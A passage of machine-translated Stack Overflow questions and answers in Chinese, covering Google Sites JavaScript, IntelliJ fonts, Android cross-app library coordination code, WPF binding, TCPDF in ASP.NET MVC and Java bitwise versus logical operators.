1.  `GROUP BY advert_interest_record.advert_id`那来自您的原始查询。你`group by`是一个不属于`SELECT`那些领域的领域。这会导致您的问题
2.  一些DBMS 要求所有`group by`字段，也必须存在于这些字段中`SELECT`

# javascript - Google 协作平台 HTML 框 - 剥离 Javascript

> ID：11052341
> 
> 赞同：2
> 
> 时间：2012-06-15T14:12:21.220
> 
> 标签：javascript, google-gadget, google-sites

我正在尝试在 Google 协作平台中利用新的 HTML Box Gadget。我们希望利用一个`<select>`框作为一个简单的菜单来导航到我们网站中的其他页面。

根据 Google ( [http://support.google.com/sites/bin/answer.py?hl=en&answer=2500646](http://support.google.com/sites/bin/answer.py?hl=en&answer=2500646) ) 提供的详细信息和示例，这应该是可以实现和支持的。但是，当页面呈现时，Javascript 消失了，并且没有任何功能。Firebug 没有报告 JS 问题。

HTML 框解析良好，小工具编辑器没有错误或警告。

我们正在使用的代码：

```
<style>
  select { font-family: Arial; width: 100px; }
  input { font-family: Arial; }
</style>

<form id="menu-form1" action="">
 <select id="jm1" class="jumpmenu">
     <option value="http://google.com/">Google</option>
     <option value="http://yahoo.com/">Yahoo!</option>
     <option value="http://ask.com/">Ask.com</option>
 </select>
 <input type="button" class="jumpbutton" value="GO" />
</form>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6/jquery.js"> </script>
<script>
var menuChange = function() {
    var selectBox = $('.jumpmenu');
    alert(selectBox.val());
    window.top.location.href = selectBox.val();
}

$('.jumpmenu').change(menuChange.bind(null));
$('.jumpbutton').click(menuChange.bind(null));

</script> 
```

除非我从 JavaScript 的角度做一些“非法”的事情，但我不认为这违背了 Google 不支持的功能：

*   内嵌框架
*   JavaScript 代码无法创建任何脚本、图像或链接标签
*   文档/窗口 onload 和 onready 功能。您可以将任何 JavaScript 放在需要在文档加载后加载的代码的末尾。

有没有人有任何类似的工作并且可以看到任何会导致 Google 站点剥离 JavaScript 的内容？

提前感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-03T23:52:13.580

您使用的是什么版本的 jQuery 很重要。尝试使用 1.7.2 版本。我将您的版本（1.6）加载到我的示例中，但它停止工作。使用 1.7.2 似乎有效。

尝试这个：

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.js"> </script> 
```

我尝试再次阅读此内容-您是否在问为什么按钮在进行选择后没有启动实际的 URL？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-05T17:33:41.770

对我有用的只是保存然后换档刷新页面。

# intellij-idea - 如何在 IntelliJ IDEA 中增加所有 UI 元素中的字体？

> ID：11052345
> 
> 赞同：101
> 
> 时间：2012-06-15T14:12:23.983
> 
> 标签：intellij-idea

是否有可能增加/减少整个 IntelliJ IDEA 中所有 UI 元素的字体大小？

* * *

## 回答 #1

> 赞同：115
> 
> 时间：2012-06-15T14:30:39.670

可以在此处覆盖 UI 的字体/大小（编辑器字体在其他位置配置）：

![UI字体覆盖](../Images/9f28f630987368a0b21250877033e6d2.png)

* * *

## 回答 #2

> 赞同：57
> 
> 时间：2014-07-13T05:44:18.403

按照以下三个步骤更改 IDE 中的所有字体（包括项目树和控制台）：

1)

根据设置菜单中的字体执行搜索：

![在此处输入图像描述](../Images/0cf8bab5747aaf9ccbcbd423538779b6.png)

2)

![在此处输入图像描述](../Images/230f08f49109106b6b9322f53794bf6b.png)

3)

![在此处输入图像描述](../Images/b4fb252d2033e3a502892cb62cccf75c.png)

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2018-04-27T18:06:15.247

从版本 2020.3 开始，用户界面如下所示：

1.  按`Ctrl`+ `Alt`+`S`
2.  设置： [![IntelliJ 设置](../Images/2821ee87e7f5f9a5cee745303d4de8cc.png)](https://i.stack.imgur.com/Zl6OY.png)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2019-12-28T06:51:49.040

我现在用的是 Intellij 2019.12.3，答案应该是：

```
Preferences -> Appearance & Behaviors -> Appearance -> Use custom font 
```

[![在此处输入图像描述](../Images/73572a813f3bd23a6b8bf719138e658d.png)](https://i.stack.imgur.com/hnpCp.png)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-06-15T14:21:34.717

这似乎有一个类似问题的答案：[是否可以更改项目面板的字体大小？](https://stackoverflow.com/questions/5380487/is-it-possible-to-change-the-font-size-of-the-project-panel)

您也可以尝试更改您的系统字体，看看 Intellij 是否会选择它。可能仅适用于菜单，并且如果您在 Linux 上使用 GTK+ 等系统主题。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2015-10-05T08:46:27.873

最简单的是：

1.  按 Ctrl+Shift+A。
2.  在弹出框中，键入增大字体大小或减小字体大小，然后单击 Enter。

[文档](https://www.jetbrains.com/idea/help/zooming-in-the-editor.html)

# android - 如何确保android库项目代码仅在集成它的已安装应用程序之一中执行？

> ID：11052347
> 
> 赞同：4
> 
> 时间：2012-06-15T14:12:24.610
> 
> 标签：android, shared-libraries, android-library, mutual-exclusion

我正在开发一个库项目，它将集成到一些流行的 android 应用程序中，这些应用程序可以在 Google Play 中看到。

假设用户可以安装两个或多个应用程序，并且每个应用程序都可以集成我的库。该库有一些特定的代码用于检测环境状态的变化。状态只是发送到我的服务器。问题是环境状态处理会占用大量 CPU 资源，但时间很短。处理周期由 AlarmManager 启动，使用启动适当 IntentService 的“非唤醒”广播。

我的目标是以这种方式实现库，只有一个集成到应用程序中的实例才能完成这项工作。我的意思是只有一个库模块应该充当“活动”。如果用户设备上安装了更多应用程序 - 那么它们不应该重叠。

如何实现？我正在考虑某种权限验证和跨包检测，但无法想象如何实现它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T16:29:59.900

I'd try something related to the CSMA/CD collision detection technique that's used (or used to be used more often) in networking.

You don't want to commit to a specific instance to be always doing the work, since you don't know if that one would get uninstalled. So instead, make the decision anew each time (since it really doesn't matter which does it at any given time).

It gets a little complicated, because it's not a trivial problem to solve, but I like the idea of someone perhaps generalizing this solution for anyone to use (open-source what you do with this?).

When the initial broadcast arrives, send out a custom broadcast (identified as coming from your particular app) that you're *also* listening for. If you don't receive any other of that same broadcast within, say, a second, then go ahead and do the work, since there must be no other instances of your library willing to do the work.

If you *do* get a message from at least one other library (keep track of all of them that you hear from), wait a random amount of time. If you receive a message from another library saying "I'll do it" within that amount of time, then immediately send out a message meaning "okay, you do it". If you *don't*, then send out a message saying "I'll do it", and wait for every other library you received a message from at the beginning to send a "okay, you do it" message. Then do the work.

If you send a "I'll do it" message, but get an "I'll do it" message from another library as well, then start the process over. The fact that each library waits a random time to send the "I'll do it" means there will rarely be collisions like this, and they certainly shouldn't often happen multiple times in a row.

I hope I've explained this well enough that you can make it happen. If not, please ask for clarification, or look at how this is done in the networking world. What I'm trying to describe is like what's called "Collision Detection", for example as referenced here: [https://en.wikipedia.org/wiki/CSMA/CD](https://en.wikipedia.org/wiki/CSMA/CD)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T15:33:08.217

> 我的目标是以这种方式实现库，只有一个集成到应用程序中的实例才能完成这项工作。

这将是相当复杂的，结果很可能是不可靠的。

我会推荐 Ian 主题的变体。将您的问题的定义更改为“我希望每 N 分钟/小时/任何时间只完成一次工作”。有一些后台作业的方法来检测上次完成工作的时间（外部存储上的文件，对您的 Web 服务的请求，等等），然后如果太快就跳过该工作。这样，您的库中安装了多少应用程序、它们的安装顺序或卸载时间都没有关系。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T18:20:02.773

为什么您不能使用设备的 ANDROID_ID（或某种电话的唯一标识符），将其注册到服务器，并且如果该库的另一个实例已经在该设备上运行 - 什么也不做。

您可以通过以下代码获取设备标识符

```
Secure.getString(context.getContentResolver(), Secure.ANDROID_ID); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T03:33:51.590

`ContentProvider`应用程序共享数据不是一种友好的方式吗？您可以使用单行 SQLite 表来实现原子时间戳。`ContentProvider`用库初始化期间创建的每隔几秒轮询一次的线程替换警报管理器方案。CP 回复“是，请发送环境状态”，这意味着它已经用当前数据/时间更新了表，或者“不，还没有”。提供商正在咨询表和系统时钟来决定何时说是。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-23T13:03:27.490

我进行了一些额外的研究，并设法找到了一个令人满意的解决方案。它来了：

必须以某种方式开发库，即每个集成它的应用程序 - 发布具有已知动作的广播接收器，例如。com.mylib.ACTION_DETECT。

库必须有额外的服务，发布一些 AIDL 接口，这有助于做出决策 - 如果可以激活库的当前实例。AIDL 可以有一些有用的方法，例如 getVersion()、isActive()、getUUID()。

做出决定的模式是：如果当前实例具有更高的版本号，则另一个 - 它将变为活动状态。如果当前实例的版本较低 - 它会自行停用，如果已经停用，则保持停用状态。如果当前实例与其他实例具有相同的版本，那么如果其他实例未处于活动状态，并且其他库的 uuid 较低（通过 compareTo 方法） - 它会自行激活。在其他情况下 - 它会自行停用。这种交叉检查确保每个库都将自行做出决定 - 不会出现模棱两可的情况，因为每个库将从其他应用程序中其他库实例的已发布 AIDL 支持的服务中获取所需的数据。

下一步是准备一个 IntentService，它在每次删除或添加新包时启动，或者第一次启动带有库的应用程序。IntentService 查询所有包以查找实现 com.mylib.ACTION_DETECT 的广播接收器。然后它遍历检测到的包（拒绝它自己的包），并绑定到其他实例的 AIDL 支持的服务（AIDL 服务的类名将始终相同，只有应用程序包会不同）。完成绑定后——我们有明确的情况——如果应用模式的结果是“积极的”（我们的实例有更好的版本或更高的 uuid，或者已经处于活动状态），那么这意味着其他实例认为自己是“消极的”，并自行停用. 当然，该模式必须应用于每个绑定的 AIDL 服务。

我为我糟糕的英语道歉。

**工作冲突避免解决方案的代码：** IntentService 类，支持绑定，所以它也是上面提到的 AIDL 支持的服务。还有 BroadcastReceiver，它启动冲突检查。

```
public class ConflictAvoidance extends IntentService
{
    private static final String TAG = ConflictAvoidance.class.getSimpleName();
    private static final String PREFERENCES = "mylib_sdk_prefs";
    private static final int VERSION = 1;
    private static final String KEY_BOOLEAN_PRIME_CHECK_DONE = "key_bool_prime_check_done";
    private static final String KEY_BOOLEAN_ACTIVE = "key_bool_active";
    private static final String KEY_LONG_MUUID = "key_long_muuid";
    private static final String KEY_LONG_LUUID = "key_long_luuid";
    private WakeLock mWakeLock;
    private SharedPreferences mPrefs;

    public ConflictAvoidance()
    {
        super(TAG);
    }

    private final IRemoteSDK.Stub mBinder = new IRemoteSDK.Stub()
    {
        @Override
        public boolean isActive() throws RemoteException
        {
            return mPrefs.getBoolean(KEY_BOOLEAN_ACTIVE, false);
        }

        @Override
        public long[] getUUID() throws RemoteException
        {
            return getLongUUID();
        }

        @Override
        public int getSdkVersion() throws RemoteException
        {
            return 1;
        }
    };

    @Override
    public IBinder onBind(Intent intent)
    {
        return mBinder;
    }

    @Override
    public void onCreate()
    {
        //#ifdef DEBUG
        Log.i(TAG, "onCreate()");
        //#endif
        mWakeLock = ((PowerManager) getSystemService(POWER_SERVICE)).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
        mWakeLock.acquire();
        mPrefs = getSharedPreferences(PREFERENCES, MODE_PRIVATE);
        super.onCreate();
    }

    @Override
    public void onDestroy()
    {
        //#ifdef DEBUG
        Log.i(TAG, "onDestroy()");
        //#endif
        mWakeLock.release();
        super.onDestroy();
    }

    @Override
    protected void onHandleIntent(Intent arg)
    {
        //#ifdef DEBUG
        Log.d(TAG, "Conflict check");
        //#endif
        final String packageName = getPackageName();
        //#ifdef DEBUG
        Log.v(TAG, "Current package name: %s", packageName);
        //#endif
        final ArrayList<String> packages = new ArrayList<String>(20);
        final PackageManager man = getPackageManager();
        //#ifdef DEBUG
        Log.v(TAG, "Querying receivers: com.mylib.android.sdk.ACTION_DETECT_LIB");
        //#endif
        final List<ResolveInfo> receivers = man.queryBroadcastReceivers(new Intent("com.mylib.android.sdk.ACTION_DETECT_LIB"), 0);
        for (ResolveInfo receiver : receivers)
        {
            if (receiver.activityInfo != null)
            {
                final String otherPackageName = receiver.activityInfo.packageName;
                //#ifdef DEBUG
                Log.v(TAG, "Checking package: %s", otherPackageName);
                //#endif
                if (!packageName.equals(otherPackageName))
                {
                    packages.add(otherPackageName);
                }
            }
        }
        if (packages.isEmpty())
        {
            //#ifdef DEBUG
            Log.i(TAG, "No other libraries found");
            //#endif
            setup(true);
        }
        else
        {
            //#ifdef DEBUG
            Log.v(TAG, "Querying other packages");
            //#endif
            final UUID uuid = getUUID();
            for (String pkg : packages)
            {
                final Intent intent = new Intent();
                intent.setClassName(pkg, "com.mylib.android.sdk.utils.ConflictAvoidance");
                final RemoteConnection conn = new RemoteConnection(uuid);
                try
                {
                    if (bindService(intent, conn, BIND_AUTO_CREATE))
                    {
                        if (!conn.canActivateItself())
                        {
                            setup(false);
                            return;
                        }
                    }
                }
                finally
                {
                    unbindService(conn);
                }
            }
            setup(true);
        }
    }

    private UUID getUUID()
    {
        final long[] uuid = getLongUUID();
        return new UUID(uuid[0], uuid[1]);
    }

    private synchronized long[] getLongUUID()
    {
        if (mPrefs.contains(KEY_LONG_LUUID) && mPrefs.contains(KEY_LONG_MUUID))
        {
            return new long[] { mPrefs.getLong(KEY_LONG_MUUID, 0), mPrefs.getLong(KEY_LONG_LUUID, 0) };
        }
        else
        {
            final long[] uuid = new long[2];
            final UUID ruuid = UUID.randomUUID();
            uuid[0] = ruuid.getMostSignificantBits();
            uuid[1] = ruuid.getLeastSignificantBits();
            mPrefs.edit().putLong(KEY_LONG_MUUID, uuid[0]).putLong(KEY_LONG_LUUID, uuid[1]).commit();
            return uuid;
        }
    }

    private void setup(boolean active)
    {
        //#ifdef DEBUG
        Log.v(TAG, "setup(active:%b)", active);
        //#endif
        mPrefs.edit().putBoolean(KEY_BOOLEAN_ACTIVE, active).putBoolean(KEY_BOOLEAN_PRIME_CHECK_DONE, true).commit();
    }

    public static StatusInfo getStatusInfo(Context context)
    {
        final SharedPreferences prefs = context.getSharedPreferences(PREFERENCES, MODE_PRIVATE);
        return new StatusInfo(prefs.getBoolean(KEY_BOOLEAN_ACTIVE, false), prefs.getBoolean(KEY_BOOLEAN_PRIME_CHECK_DONE, false));
    }

    public static class DetectionReceiver extends BroadcastReceiver
    {
        @Override
        public void onReceive(Context context, Intent intent)
        {
            context.startService(new Intent(context, ConflictAvoidance.class));         
        }       
    }

    public static class StatusInfo
    {
        public final boolean isActive;
        public final boolean primeCheckDone;

        public StatusInfo(boolean isActive, boolean primeCheckDone)
        {
            this.isActive = isActive;
            this.primeCheckDone = primeCheckDone;
        }       
    }

    protected static class RemoteConnection implements ServiceConnection
    {
        private final ConditionVariable var = new ConditionVariable(false);
        private final UUID mUuid;
        private final AtomicReference<IRemoteSDK> mSdk = new AtomicReference<IRemoteSDK>();

        public RemoteConnection(UUID uuid)
        {
            super();
            this.mUuid = uuid;
        }

        @Override
        public void onServiceConnected(ComponentName name, IBinder service)
        {
            //#ifdef DEBUG
            Log.v(TAG, "RemoteConnection.onServiceConnected(%s)", name.getPackageName());
            //#endif
            mSdk.set(IRemoteSDK.Stub.asInterface(service));
            var.open();
        }

        @Override
        public void onServiceDisconnected(ComponentName name)
        {
            //#ifdef DEBUG
            Log.w(TAG, "RemoteConnection.onServiceDisconnected(%s)", name);
            //#endif
            var.open();
        }

        public boolean canActivateItself()
        {
            //#ifdef DEBUG
            Log.v(TAG, "RemoteConnection.canActivateItself()");
            //#endif
            var.block(30000);
            final IRemoteSDK sdk = mSdk.get();
            if (sdk != null)
            {
                try
                {
                    final int version = sdk.getSdkVersion();
                    final boolean active = sdk.isActive();
                    final UUID uuid;
                    {
                        final long[] luuid = sdk.getUUID();
                        uuid = new UUID(luuid[0], luuid[1]);
                    }
                    //#ifdef DEBUG
                    Log.v(TAG, "Other library: ver: %d, active: %b, uuid: %s", version, active, uuid);
                    //#endif
                    if (VERSION > version)
                    {
                        return true;
                    }
                    else if (VERSION < version)
                    {
                        return false;
                    }
                    else
                    {
                        if (active)
                        {
                            return false;
                        }
                        else
                        {
                            return mUuid.compareTo(uuid) == 1;
                        }
                    }
                }
                catch (Exception e)
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }
    }

} 
```

**AIDL 文件：**

```
package com.mylib.android.sdk;

interface IRemoteSDK
{
    boolean isActive();
    long[] getUUID();
    int getSdkVersion();
} 
```

**样本清单：**

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.mylib.android.sdk"
    android:versionCode="1"
    android:versionName="1.0" >
    <uses-sdk
        android:minSdkVersion="4"
        android:targetSdkVersion="4" />
        <service
            android:name="com.mylib.android.sdk.utils.ConflictAvoidance"
            android:exported="true" />
        <receiver android:name="com.mylib.android.sdk.utils.ConflictAvoidance$DetectionReceiver" >
            <intent-filter>
                <action android:name="com.mylib.android.sdk.ACTION_DETECT_LIB" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED" />
                <action android:name="android.intent.action.PACKAGE_REMOVED" />
                <action android:name="android.intent.action.PACKAGE_DATA_CLEARED" />
                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                <data android:scheme="package" />
            </intent-filter>
        </receiver>
    </application>
</manifest> 
```

行动：

```
<action android:name="com.mylib.android.sdk.ACTION_DETECT_LIB" /> 
```

这是常用操作，用于检测带有库的其他应用程序。

日志使用可能看起来很奇怪，但我使用支持格式化的自定义包装器来减少调试时的 StringBuffers 开销。

# tridion - 如何使用模板生成器安装 Tridion 默认模板？

> ID：11052349
> 
> 赞同：4
> 
> 时间：2012-06-15T14:12:33.017
> 
> 标签：tridion

我想使用模板生成器安装 Tridion 2011 默认模板。我选择工具，创建默认构建块，选择文件夹，然后选择确定。我已经在服务器上和本地使用模板生成器尝试过这个。

它等待大约 1 秒钟并表示成功。我在 Tridion 中看到一个新文件夹“默认模板”，但那里没有模板。

我对默认完成操作 TBB 非常感兴趣。

是否有另一种安装默认 TBB 的方法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:29:07.117

这听起来有点奇怪。您是否检查了“默认模板”下是否有另一个文件夹，并且您可能在那里导入了？创建默认模板时选择的文件夹。

检查以下文档以仅加载特定的默认模板： [http ://sdllivecontent.sdl.com/LiveContent/content/en-US/SDL_Tridion_2011_SPONE/task_66B5DBF6F598472AA30D61E947BC479A](http://sdllivecontent.sdl.com/LiveContent/content/en-US/SDL_Tridion_2011_SPONE/task_66B5DBF6F598472AA30D61E947BC479A)

# wpf - WPF 无法从变量更新文本框

> ID：11052352
> 
> 赞同：0
> 
> 时间：2012-06-15T14:12:47.023
> 
> 标签：wpf, vb.net, binding, inotifypropertychanged

使用 WPF 和 VB.net，我想用当前日期和时间更新文本块中的文本框。我使用了一个计时器，它似乎正在触发，并将对象属性设置为“现在”。我正在使用 iNotifyPropertyChanged。

我得到的只是一个没有数据的空文本框。你能帮我吗？也许我的上下文是关闭的？

**XAML**

```
<Window x:Class="MainWindow"
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
Title="MainWindow" Height="350" Width="525">
<Grid>
    <TextBlock DataContext="oTime"> 
        <TextBox x:Name="myTextBox" 
                 Width="200" Height="50" Foreground="Black" 
                 Text="{Binding Path=oTime.TimeUpdate}"></TextBox>
    </TextBlock>
</Grid>
</Window> 
```

**VB代码**

```
Imports System.ComponentModel
Imports System.Windows.Threading

Class MainWindow
  Public oTime As TimeUpdate = New TimeUpdate
  Private dpTimer As DispatcherTimer

  Private Sub TextBlock_SourceUpdated(ByVal sender As System.Object, ByVal e As System.Windows.Data.DataTransferEventArgs)

  End Sub

  Private Sub MainWindow_Loaded(ByVal sender As Object, ByVal e As System.Windows.RoutedEventArgs) Handles Me.Loaded
      dpTimer = New DispatcherTimer
      dpTimer.Interval = TimeSpan.FromMilliseconds(1000)
      AddHandler dpTimer.Tick, AddressOf TickMe
      dpTimer.Start()
  End Sub

  Private Sub TickMe()
      oTime.TimeUpdate = Now.ToString
      Debug.Print(oTime.TimeUpdate)
  End Sub

End Class

Public Class TimeUpdate
Implements INotifyPropertyChanged

  Private sTime As String

  'Declare the Event
  Public Event PropertyChanged(ByVal sender As Object, ByVal e As System.ComponentModel.PropertyChangedEventArgs) Implements System.ComponentModel.INotifyPropertyChanged.PropertyChanged

  Public Property TimeUpdate() As String
      Get
          Return sTime

      End Get
      Set(ByVal value As String)
          sTime = value
          'Call onPropertyChanged whenever the property is updated
          OnPropertyChanged("TimeUpdate")
      End Set

  End Property

  Protected Sub OnPropertyChanged(ByVal name As String)
      RaiseEvent PropertyChanged(Me, New PropertyChangedEventArgs(name))
  End Sub

End Class 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:54:07.937

似乎缺少一些东西。首先没有设置窗口的DataContext。你可以做它的构造函数：

```
Public Sub New()
    DataContext = oTime
End Sub 
```

这允许您的视图查看 TimeUpdate 类的内容。

然后更改您的 XAML（直接绑定到 TimeUpdate 属性）：

```
<Grid> 
    <TextBox x:Name="myTextBox" 
             Width="200" Height="50" Foreground="Black" 
             Text="{Binding Path=TimeUpdate}"></TextBox>
</Grid> 
```

**更新：** 另一种方法是在 Window 标记中添加 DataContext 行。这样，您的 MainWindow 类对视图可见，并且您可以绑定到公共属性。

```
<Window x:Class="MainWindow"
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
DataContext="{Binding RelativeSource={RelativeSource Self}}"
Title="MainWindow" Height="350" Width="525"> 
```

现在创建一个公共属性来访问该对象：

```
Public Property OTime() As TimeUpdate
    Get
        Return oTime
    End Get
    Set
        oTime = value
    End Set
End Property 
```

并将文本框绑定到它：

```
<Grid> 
    <TextBox x:Name="myTextBox" 
             Width="200" Height="50" Foreground="Black" 
             Text="{Binding Path=OTime.TimeUpdate}"></TextBox>
</Grid> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:25:05.613

我认为您的数据上下文已关闭。如果我错了，对我来说是正确的，但看起来您将其设置为字符串值而不是对象。oTime 是您在 XAML 中作为资源创建的对象吗？如果是这样，您将需要使用 StaticResource 来获取它。否则，您将需要实例化。

例如。

```
<TextBlock >
    <TextBlock.DataContext>
        <!-- This will instantiate the object-->
        <local:TimeUpdate/> 
    </TextBlock.DataContext>
     <TextBox x:Name="myTextBox" Width="200" Height="50" Foreground="Black" Text="{Binding Path=TimeUpdate}"></TextBox>
</TextBlock> 
```

编辑：我刚刚注意到您在 MainWindow 类中实例化了一个 TimeUpdate 对象。在这种情况下，我会在后面的代码中将 Window 的 DataContext 设置为自身，并使 oTime 成为一个属性。这样您就不必为`TextBlock`. 它将使用父级的 DataContext，在本例中为`Window`. 您的 XAML 现在如下所示：

```
<TextBlock>
     <TextBox x:Name="myTextBox" Width="200" Height="50" Foreground="Black" Text="{Binding Path=oTime.TimeUpdate}"/>
</TextBlock> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:53:42.700

尝试通过更改此：

```
 Text="{Binding Path=oTime.TimeUpdate}" 
```

至：

```
 Text="{Binding Path=oTime.TimeUpdate, UpdateSourceTrigger="PropertyChanged"}" 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-06-15T14:16:56.570

尝试改变这个

```
OnPropertyChanged("TimeUpdate") 
```

对此

```
OnPropertyChanged("oTime") 
```

另外，请确保您已在根网格上设置 DataContext

```
<Grid DataContext="{Binding RelativeSource={RelativeSource Mode=Self}, Path=.}"> 
```

# c# - 使用 TCPDF 在 ASP.NET MVC 中生成 PDF

> ID：11052355
> 
> 赞同：2
> 
> 时间：2012-06-15T14:13:02.057
> 
> 标签：c#, asp.net-mvc, pdf-generation, tcpdf

基本上，我在建议将带有图表、图像和一些样式的动态 PDF 生成到视图或部分视图中，供用户打印或选择性下载。

我过去使用过 TCPDF，所以想知道是否有任何方法可以利用我的 TCPDF php 文件将生成的 PDF 传递到视图中？

我也看过 ITextSharp，但我担心缺乏自定义，包括 TCPDF 过去提供给我的动态图表。

谁能指出我正确的方向？目前我正在尝试为 Visual Studio 2010 安装 VS.PHP 模块，希望我可以将生成的 TCPDF 文件加载到内存流中并将其传递给视图（内联）。

我的逻辑完全错误吗？请指教。

谢谢。

[编辑]

我在我的项目中添加了 Phalanger (http://phalanger.codeplex.com/) 以及我的 Content/reports 文件夹中的一些 tcpdf 示例。

我的控制器代码非常简单（大部分是从 Phalanger 论坛上的另一篇文章中获得的）：

```
 public ActionResult SummaryReport()
    {
        var context = PHP.Core.ScriptContext.CurrentContext;

        using (var request_context = PHP.Core.RequestContext.Initialize(PHP.Core.ApplicationContext.Default, System.Web.HttpContext.Current))
        {
            var output = request_context.ScriptContext.Include(Server.MapPath(Url.Content("~/Content/reports/testoutput.php")), false);

            return Content("");
        }
     } 
```

但是，当控制器尝试执行 TCPDF 示例时，我现在收到了 TCPDF 错误：

```
Warning: preg_match(): Invalid argument 'pattern':     u0192\u2039\u008D\u203A\u017E\u0178\u00A1-\u00BA] # AL | Ù[\u20AC-\u0160\u00AD-\u00AF\u00B1-\u00BF] # AL | Ú[\u20AC-\u00BF] # AL | Û[\u20AC-\u2022\u009D\u00A5\u00A6\u00AE\u00AF\u00BA-\u00BF] # AL | Ü[\u20AC-\u008D\u0090\u2019-\u00AF] # AL | Ý[\u008D-\u00AD] # AL | Þ[\u20AC-\u00A5\u00B1] # AL | ï­[\u0090-\u00BF] # AL | ï®[\u20AC-\u00B1] # AL | ï¯[\u201C-\u00BF] # AL | ï[\u00B0-\u00B3][\u20AC-\u00BF] # AL | ï´[\u20AC-\u00BD] # AL | ïµ[\u0090-\u00BF] # AL | ï¶[\u20AC-\u008F\u2019-\u00BF] # AL | ï·[\u20AC-\u2021\u00B0-\u00BC] # AL | ï¹[\u00B0-\u00B4\u00B6-\u00BF] # AL | ïº[\u20AC-\u00BF] # AL | ï»[\u20AC-\u00BC] ..." - [x-y] range in reverse order. in (MYPATH)\Content\reports\tcpdf\tcpdf.php on line 15859, column 7.

Warning: preg_match(): Invalid argument 'pattern': [x-y] range in reverse order. in (MYPATH)\Content\reports\tcpdf\tcpdf.php on line 15865, column 7. 
```

有谁知道如何克服这个问题？我很可能会在 TCPDF 论坛上发布最新的 TCPDF。我担心如果我不能让这些工作，我会使用 .NET PDF 库，因为我受到严格的时间限制。

谢谢你的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-20T16:00:03.827

你看过ABCpdf了吗？这似乎是适合您的解决方案:)

ps：链接包含在我的评论中

# java - Java：按位 OR 和 AND 是否比等效的逻辑运算符更快？

> ID：11052362
> 
> 赞同：7
> 
> 时间：2012-06-15T14:13:31.080
> 
> 标签：java, bit-manipulation

切和干......虽然我从来没有足够的逻辑操作让它成为性能瓶颈 - 我想知道，与同名的逻辑运算符相比，使用按位和（&）和按位或（|）会更好吗（&& 和 ||）如果可能的话？也许这个问题可以以我不知道将 Java 转换为程序集以查看操作数的库这一事实作为开头。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-06-15T14:18:23.850

位运算符避免分支指令，即使在 Java 代码执行中也是如此。因此，您没有昂贵的分支预测失误，也没有任何跳转。

根据我的经验，当用于经常执行的代码时，它们*可以明显更快。*但请记住，按位运算符不是短路运算符，在某些情况下这实际上可能会对性能产生负面影响。

也就是说，这种微优化只能作为最后的手段，并且只有在分析器告诉你这样做之后——可读性和可维护性是第一位的。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-15T20:57:52.947

我建议您在 Parleys.com 上观看 Josh Bloch 的“Performance Anxiety”演讲。[http://www.parleys.com/#st=5&id=2103&sl=1](http://www.parleys.com/#st=5&id=2103&sl=1)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-06-15T14:15:51.923

无论如何，其中大部分都会被编译器优化。一个快速的谷歌显示了[这个方便的指南](http://weblogs.java.net/blog/kohsuke/archive/2008/03/deep_dive_into.html)，将你的 Java 视为汇编程序。我一直认为清晰易读的代码比 CPU 时间少几纳秒更重要。

由于 JVM 的额外层，Java 并不是最好的语言。如果您对这种精确的优化感兴趣，您可能希望转向另一种语言，例如 C/C++。 [此列表](http://benchmarksgame.alioth.debian.org/)显示您可能想要查看的语言。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-06-15T14:16:03.500

> 我想知道，如果可能的话，使用按位和 (&) 和按位或 (|) 而不是逻辑运算符会更好吗？

奇怪的是，您从询问有关性能的琐碎问题变成询问您是否应该在代码中实际执行此操作。好吧，第二个很容易。不。作为开发人员编写不太清晰的代码的成本将超过 CPU 成本的纳秒差异。如果您无论如何都需要优化这一点，请使用 C 或 C++。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-06-15T14:16:10.330

Java 编译器只是编译成与实际机器码相差甚远的字节码。这样做是 JVM 的责任，而像 HotSpot 这样的现代 JVM 非常擅长这样做。因此，编写最简单、最清晰的代码来完成您需要做的事情。

简而言之，您很可能无法衡量任何差异。

要查看生成的实际机器代码，您需要让 JVM 向您展示。这取决于供应商。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-06-15T14:18:44.247

不。

首先，与逻辑运算符相比，使用位运算符容易出错（例如，右移 1 不等于乘以 2）。其次，性能优势可以忽略不计（如果有的话）。

最后但同样重要的是，使用逻辑运算符可以更好地传达含义。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-06-15T14:18:10.293

您可以尝试编写一个具有 100000 位运算的小程序，使用计时器函数来确定运行时间。然后对逻辑操作做同样的事情。运行它们几次并检查结果。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-06-15T14:56:33.893

